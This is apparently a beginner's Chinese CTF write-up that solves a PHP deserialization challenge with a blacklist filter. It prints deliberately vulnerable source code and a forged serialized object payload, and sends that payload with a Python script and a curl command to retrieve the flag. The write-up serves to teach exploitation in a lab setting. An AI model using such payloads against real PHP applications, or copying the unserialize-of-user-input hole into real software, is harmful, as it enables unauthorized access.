# WP | qsnctf 反序列化 + 黑名单绕过（小白版）

> 题目：`http://challenge.qsnctf.com:40507/`
> 考点：PHP 反序列化 `unserialize`、对象属性覆盖、黑名单过滤绕过
> 日期：2026-08-15

---

## 0. 一句话地图

服务器有个"保险柜"(flag)，开柜条件是：**我们造出来的对象，它的密码属性 `pswd` 必须等于字符串 `'escaping'`**。
我们改不了源码，但能用 `unserialize`（反序列化）**伪造一个对象**，把密码直接设成 `'escaping'`，从而骗过开柜判断，拿到 flag。

---

## 1. 固定比喻（贯穿全程）

| 概念 | 比喻 |
|---|---|
| `class test`（类） | 大楼的**设计图纸**（模板） |
| 对象 object | 按图纸盖好的**一栋具体大楼** |
| 属性 `$user` `$pswd` | 大楼里的**房间/保险柜** |
| `serialize` | 把大楼拆成一张**装箱清单**字符串（方便传输） |
| `unserialize` | 照着清单**还原**出大楼 |
| `payload` | 我们**伪造的装箱清单** |
| `$profile->pswd=='escaping'` | 保险柜的**密码锁**：只有密码是 `escaping` 才开 |
| `echo $flag` | 保险柜里的**宝贝**被取出 |
| `filter` 黑名单 | 门口**安检**：看到 `flag`/`php` 字样就拦下换成 `stop` |

---

## 2. 第 1 步｜读源码，找开柜钥匙（信息收集）

题目用 `highlight_file(__FILE__)` 把源码自己打印在页面上（敌人主动递来设计图）。整理后的源码：

```php
<?php
highlight_file(__FILE__);
include("flag.php");                // flag 变量已包含进当前作用域

function filter($payload){
    $black_list = array("flag","php");
    return str_replace($black_list,"stop",$payload);  // flag/php → stop
}

class test{
    var $user = 'test';
    var $pswd = 'sunshine';          // 默认密码 sunshine
    function __construct($user){ $this->user = $user; }
}

$payload = $_GET['payload'];
$profile = unserialize(filter($payload));   // 先过滤，再反序列化
if ($profile->pswd == 'escaping'){          // ⭐ 开柜条件
    echo "逃出来了, 恭喜恭喜<br>";
    echo $flag;                              // ⭐ 满足条件就出 flag
}
?>
```

**钥匙 = 反序列化得到的对象，其 `pswd` 属性必须等于字符串 `'escaping'`**。

---

## 3. 第 2 步｜理解 unserialize 能"造对象"（核心概念）

默认情况下 `test` 类造出来的对象密码是 `'sunshine'`，不对。
但 `unserialize(字符串)` 的厉害之处在于：**还原出来的对象，它的属性值完全由我们给的那段字符串决定**。
所以我们可以直接伪造一份"装箱清单"，让还原出来的大楼，保险柜密码就是 `'escaping'`。

> 类比：正常大楼密码锁是 sunshine，但我们手里有"伪造的装箱清单"，照单还原时，我们写密码是 escaping，服务器就信了。

---

## 4. 第 3 步｜黑名单是纸老虎（分析过滤）

`filter` 会把 `"flag"` 和 `"php"` 替换成 `"stop"`。
**但我们的伪造清单里根本不含 `flag` 或 `php` 这两个词** → 安检对我们放行。
这是出题人放的"吓人陷阱"，不用怕。

---

## 5. 第 4 步｜动手造"装箱清单"（序列化字符串）

目标：造一个 `test` 对象，使其 `pswd = 'escaping'`。

PHP 序列化格式拆解（照抄，每个数字 = 后面字符串的长度）：

```
O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}
 │  │      │ │ │      │ │ │      │ │ │
 │  │      │ │ │      │ │ │      │ │ └─ 值 escaping（8 个字符）
 │  │      │ │ │      │ │ │      │ └─── 值类型/长度：s:8
 │  │      │ │ │      │ │ │      └───── 属性名 pswd（4 字符）
 │  │      │ │ │      │ │ └──────────── 属性名类型/长度：s:4
 │  │      │ │ │      │ └────────────── 属性1 user（值 test，4字符）
 │  │      │ │ │      └───────────────── 属性数量 = 2
 │  │      │ │ └──────────────────────── 类名 test（4 字符）
 │  │      │ └────────────────────────── 类名长度前缀
 │  └────── └──────────────────────────── 类名
 └───────── O = Object（对象）
```

核对：`escaping` 正好 8 个字母 → `s:8`；`test` 4 个 → `s:4`；`pswd` 4 个 → `s:4`；`user` 4 个 → `s:4`。✓

---

## 6. 第 5 步｜发送 payload，开门拿 flag

Windows/PowerShell 引号地狱，按约定**用 Python 脚本文件发**（标准库 urllib，无需装包）：

```python
# solve.py  —— 保存到任意位置，python solve.py 运行
import urllib.request, urllib.parse

url = "http://challenge.qsnctf.com:40507/"
payload = 'O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}'
req = urllib.request.Request(url + "?payload=" + urllib.parse.quote(payload))
html = urllib.request.urlopen(req, timeout=20).read().decode(errors="ignore")
print(html)
```

或用 curl（自动 URL 编码，推荐）：
```bash
curl.exe -G "http://challenge.qsnctf.com:40507/" \
  --data-urlencode 'payload=O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}'
```

返回包含：`逃出来了, 恭喜恭喜` + `flag{3d98dbb9832e445a904193aae6c06d8d}`

---

## 7. 知识点小结

1. **源码暴露 = 白送情报**：`highlight_file` 直接读源码，先找 `echo $flag` 的触发条件。
2. **反序列化 = 伪造对象**：`unserialize` 还原出的对象属性由我们控制，可覆盖默认属性值。
3. **属性覆盖 = 改密码**：把 `pswd` 从默认 `sunshine` 改成 `escaping` 满足判断。
4. **黑名单要看清范围**：`flag`/`php` 替换成 `stop`，但我们 payload 不含这俩词，过滤无效。
5. **复杂 payload 用脚本发**：PowerShell 引号特殊字符多，写 Python 文件最稳。
